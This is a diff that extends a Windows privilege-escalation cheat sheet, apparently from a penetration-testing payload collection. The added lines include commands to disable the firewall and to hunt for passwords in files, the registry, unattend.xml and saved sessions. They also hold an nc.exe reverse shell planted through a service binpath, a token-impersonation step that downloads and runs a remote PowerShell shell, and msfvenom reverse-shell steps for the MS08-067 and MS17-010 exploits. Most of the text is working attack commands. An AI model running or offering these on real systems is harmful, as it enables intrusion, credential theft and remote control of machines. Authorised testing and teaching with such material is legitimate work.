@@ -15,11 +15,19 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposures)
+  * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
+  * [MS08-067 (NetAPI)](#ms08-067-netapi)
+  * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
+  * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
 
 ## Tools
 
 - [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
 - [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)
+    ```powershell
+    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
+    ```
 - [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 - [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
     ```powershell
@@ -86,7 +94,6 @@ List all users
 
 ```powershell
 net user
-net user Swissky
 whoami /all
 Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
@@ -162,6 +169,19 @@ netsh firewall show state
 netsh firewall show config
 ```
 
+List firewall's blocked ports
+
+```powershell
+$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
+```
+
+Disable firewall
+
+```powershell
+netsh firewall set opmode disable
+netsh advfirewall set allprofiles state off
+```
+
 List all network shares
 
 ```powershell
@@ -200,6 +220,8 @@ findstr /spin "password" *.*
 
 ```powershell
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+where /R C:\ user.txt
+where /R C:\ *.ini
 ```
 
 ### Search the registry for key names and passwords
@@ -209,6 +231,7 @@ REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
 reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
@@ -226,7 +249,7 @@ REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 
 ### Passwords in unattend.xml
 
-Location of the unattend.xml files
+Location of the unattend.xml files.
 
 ```powershell
 C:\unattend.xml
@@ -241,7 +264,7 @@ Example content
 ```powershell
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
     <AutoLogon>
-     <Password>*SENSITIVE*DATA*DELETED*</Password>
+     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
      <Enabled>true</Enabled>
      <Username>Administrateur</Username>
     </AutoLogon>
@@ -255,6 +278,13 @@ Example content
       </LocalAccount>
      </LocalAccounts>
     </UserAccounts>
+```
+
+Unattend credentials are stored in base64 and can be decoded manually with base64.
+
+```powershell
+$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
+SecretSecurePassword1234*
 ```
 
 The Metasploit module `post/windows/gather/enum_unattend` looks for these files.
@@ -310,6 +340,19 @@ Oneliner method to extract wifi passwords from all the access point.
 ```batch
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
+
+### Passwords stored in services
+
+Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
+
+
+```powershell
+https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
+Import-Module path\to\SessionGopher.ps1;
+Invoke-SessionGopher -AllDomain -o
+Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
+```
+
 
 ## EoP - Processes Enumeration and Tasks
 
@@ -399,9 +442,12 @@ You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify
 ### Example with Windows XP SP1
 
 ```powershell
-$ sc config upnphost binpath="C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
-sc config upnphost obj=".\LocalSystem" password=""
+# NOTE: spaces are mandatory for this exploit to work !
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
+sc config upnphost depend= ""
+net start upnphost
 ```
 
 If it fails because of a missing dependency, try the following commands.
@@ -563,6 +609,101 @@ $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
+## EoP - Common Vulnerabilities and Exposure
+
+### Token Impersonation (RottenPotato)
+
+Binary available at : https://github.com/foxglovesec/RottenPotato
+Binary available at : https://github.com/breenmachine/RottenPotatoNG
+
+```c
+getuid
+getprivs
+use incognito
+list\_tokens -u
+cd c:\temp\
+execute -Hc -f ./rot.exe
+impersonate\_token "NT AUTHORITY\SYSTEM"
+```
+
+```powershell
+Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
+Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
+Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
+```
+
+### MS08-067 (NetAPI)
+
+Check the vulnerability with the following nmap script.
+
+```c
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>
+```
+
+Metasploit modules to exploit `MS08-067 NetAPI`.
+
+```powershell
+exploit/windows/smb/ms08_067_netapi
+```
+
+If you can't use Metasploit and only want a reverse shell.
+
+```powershell
+https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+
+Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
+Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
+Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
+Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
+Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
+Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
+Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
+python ms08-067.py 10.0.0.1 6 445
+```
+
+
+### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
+
+Check if the patch is installed : `wmic qfe list | findstr "3139914"`
+
+```powershell
+Powershell:
+https://www.exploit-db.com/exploits/39719/
+https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+
+Binary exe : https://github.com/Meatballs1/ms16-032
+
+Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+```
+
+### MS17-010 (Eternal Blue)
+
+Check the vulnerability with the following nmap script.
+
+```c
+nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
+```
+
+Metasploit modules to exploit `EternalRomance/EternalSynergy/EternalChampion`.
+
+```powershell
+auxiliary/admin/smb/ms17_010_command          MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+auxiliary/scanner/smb/smb_ms17_010            MS17-010 SMB RCE Detection
+exploit/windows/smb/ms17_010_eternalblue      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+exploit/windows/smb/ms17_010_psexec           MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+```
+
+If you can't use Metasploit and only want a reverse shell.
+
+```powershell
+git clone https://github.com/helviojunior/MS17-010
+
+# generate a simple reverse shell to use
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
+python2 send_and_execute.py 10.0.0.1 revshell.exe
+```
 
 
 ## References
